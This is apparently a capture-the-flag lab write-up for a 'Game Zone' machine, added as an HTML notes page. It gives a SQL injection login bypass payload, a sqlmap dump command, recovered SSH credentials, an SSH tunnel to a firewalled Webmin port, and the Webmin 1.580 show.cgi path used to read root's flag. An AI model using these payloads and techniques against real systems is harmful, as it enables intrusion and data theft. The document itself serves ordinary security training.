@@ -1,0 +1,55 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Game Zone</title>
+</head><body><span style="font-size: 18pt">Website login is injectable with SQL<br/>
+&gt; ' OR 1=1-- -<br/>
+<br/>
+saved post request from searchbar after login and sent it through sqlmap<br/>
+&gt; sqlmap -r request.txt --dbms=mysql --dump<br/>
+<br/>
+</span><img height="295" src="image.png" width="800"/><br/>
+<span style="font-size: 18pt"><br/>
+agent47 : videogamer124<br/>
+<br/>
+SQL tables:<ul><li style="list-style-type: none">- users</li>
+<li style="list-style-type: none">- post</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">ssh agent47@10.10.253.98</li>
+<li style="list-style-type: none">password: videogamer124</li>
+<li style="list-style-type: none"/>
+</ul>
+User.txt<br/>
+649ac17b1480ac13ef1e4fa579dac95c<br/>
+=============================================<br/>
+Enumerate sockets:<br/>
+&gt; ss -tulpn<br/>
+<br/>
+</span><div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: Ubuntu">We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!</span></span></div> <span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><br/>
+<img height="118" src="image 2.png" width="850"/><br/>
+ssh -L 10000:localhost:10000 agent47@10.10.253.98</span><span style="font-size: 14pt"><b>-L</b><div style="text-align: center"><span style="font-family: Ubuntu"> is a local tunnel (YOU &lt;-- CLIENT)</span></div> <br/>
+</span><span style="font-size: 14pt"><b>-R</b><div style="text-align: center"><span style="font-family: Ubuntu"> is a remote tunnel (YOU --&gt; CLIENT)</span></div> </span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 14pt">so we create local tunnel to port 10000 using info</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><br/>
+now we can access the web login <ul><li style="list-style-type: none">We know it runs on Webmin </li>
+<li style="list-style-type: none">- version 1.580</li>
+</ul>
+<br/>
+</span><span style="font-size: 12pt">Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)       | unix/remote/21851.rb</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><br/>
+reading into the exploit before exploitation<br/>
+&gt; we don't even need to run it in order to access file<br/>
+&gt; accessed with http://localhost:10000/file/show.cgi/root/root.txt<br/>
+Root Flag<ul><li style="list-style-type: none">a4b945830144bdd71908d12d902adeee</li>
+</ul>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</span></body></html>
